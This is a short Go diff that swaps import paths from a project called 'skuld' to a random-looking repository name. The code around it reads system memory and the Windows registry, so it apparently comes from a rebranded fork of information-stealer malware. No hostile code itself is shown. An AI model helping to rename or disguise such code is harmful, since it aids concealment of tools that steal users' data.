@@ -15,8 +15,8 @@ import (
 	"github.com/shirou/gopsutil/v3/mem"
 	"golang.org/x/sys/windows/registry"
 
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
+	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
+	"github.com/0xFl4q/1237FHJQSDF1234/utils/requests"
 )
 
 func GetOS() string {
